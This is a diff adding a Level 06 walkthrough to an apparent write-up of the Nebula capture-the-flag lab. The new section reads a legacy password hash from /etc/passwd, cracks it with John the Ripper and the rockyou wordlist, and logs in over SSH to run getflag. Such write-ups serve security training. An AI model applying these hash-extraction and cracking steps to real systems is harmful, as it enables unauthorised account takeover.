@@ -20,6 +20,7 @@ The username and password for each level take  the form 'levelnn' where nn is th
 [Level 03](#level-03)  
 [Level 04](#level-04)  
 [Level 05](#level-05)  
+[Level 06](#level-06)  
 
 ### Level 00
 
@@ -261,5 +262,41 @@ applicable law.
 flag05@nebula:~$ 
 
 flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+```
+
+### Level 06
+
+[Level 06 Description](https://exploit.education/nebula/level-06/)  
+
+```
+level06@nebula:~$ ls -al
+total 5
+drwxr-x--- 1 level06 level06   60 2021-03-28 08:00 .
+drwxr-xr-x 1 root    root     200 2012-08-27 07:18 ..
+-rw-r--r-- 1 level06 level06  220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 level06 level06 3353 2011-05-18 02:54 .bashrc
+drwx------ 2 level06 level06   60 2021-03-28 08:00 .cache
+-rw-r--r-- 1 level06 level06  675 2011-05-18 02:54 .profile
+level06@nebula:~$ ls -al /home/flag06
+total 5
+drwxr-x--- 2 flag06 level06   66 2011-11-20 20:51 .
+drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag06 flag06   220 2011-05-18 02:54 .bash_log
+```
+The task description states that the flag06 login comes from a legacy unix account. This means that the hash is in /etc/passwd and not /etc/shadow.
+```
+level06@nebula:~$ cat /etc/passwd
+...
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+...
+```
+Copy entry for flag06 to hash.txt and crack using John The Ripper on attack machine.
+```
+$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+Login as flag06 user via ssh using the password and then run getflag
+```
+flag06@nebula:~$ getflag
 You have successfully executed getflag on a target account
 ```
